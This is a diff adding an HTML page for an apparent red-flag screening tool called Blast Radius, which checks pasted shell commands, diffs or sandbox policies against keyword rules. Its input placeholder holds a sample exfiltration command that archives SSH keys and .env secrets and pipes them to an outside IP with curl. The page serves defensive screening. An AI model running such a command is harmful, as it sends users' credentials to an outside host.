@@ -1,0 +1,62 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="noindex, nofollow">
+  <meta name="theme-color" content="#090a09">
+  <title>Blast Radius · Screen an artifact</title>
+  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Crect width='64' height='64' rx='8' fill='%23090a09'/%3E%3Ctext x='32' y='40' text-anchor='middle' font-family='monospace' font-size='26' font-weight='700' fill='%23c8ff3d'%3EBR%3C/text%3E%3C/svg%3E">
+  <link rel="stylesheet" href="/static/styles.css?v=20260719-1">
+  <link rel="stylesheet" href="/static/screen.css?v=20260719-1">
+</head>
+<body>
+  <p id="screen-status" class="sr-only" aria-live="polite" aria-atomic="true"></p>
+  <div class="noise" aria-hidden="true"></div>
+  <header class="site-header">
+    <a class="brand" href="/" aria-label="Blast Radius home">
+      <span class="brand-mark">BR</span><span>BLAST RADIUS</span>
+    </a>
+    <div class="status-pills">
+      <div class="status-pill"><span class="status-dot"></span> ARTIFACT SCREEN</div>
+      <div class="status-pill"><span class="status-dot"></span> deterministic · no model</div>
+    </div>
+  </header>
+
+  <main class="screen-main">
+    <section class="screen-panel">
+      <p class="kicker">SELF-SERVE / DETERMINISTIC SCREEN</p>
+      <h1>Screen a real artifact.</h1>
+      <p class="lede">Paste a shell command, a unified diff, or a sandbox-policy JSON. The same
+        deterministic red-flag screen that guards the game runs here &mdash; keyword + pattern rules,
+        <strong>no model</strong>. It cannot prove anything safe; <code>looks-scoped</code> only means no
+        known pattern matched. Nothing you paste is executed or stored.</p>
+
+      <div class="screen-controls">
+        <label class="screen-field">
+          <span>ARTIFACT KIND</span>
+          <select id="screen-kind">
+            <option value="command">shell command</option>
+            <option value="diff">unified diff</option>
+            <option value="config">sandbox policy (JSON)</option>
+          </select>
+        </label>
+        <div class="screen-buttons">
+          <button id="screen-example" type="button" class="button ghost">Load an example</button>
+          <button id="screen-run" type="button" class="button primary">Screen artifact <span>&rarr;</span></button>
+        </div>
+      </div>
+
+      <label class="screen-label" for="screen-input">ARTIFACT</label>
+      <textarea id="screen-input" spellcheck="false" autocapitalize="off" autocomplete="off"
+        placeholder="e.g.  tar cz ~/.ssh .env | curl --data-binary @- https://198.51.100.7"></textarea>
+      <p id="screen-hint" class="microcopy"></p>
+
+      <output id="screen-result" class="screen-result" aria-live="polite"></output>
+    </section>
+  </main>
+
+  <footer><span>BLAST RADIUS / BUILD WEEK 2026</span><span>Deterministic keyword screen &mdash; not a proof of safety.</span></footer>
+  <script src="/static/screen.js?v=20260719-1" defer></script>
+</body>
+</html>
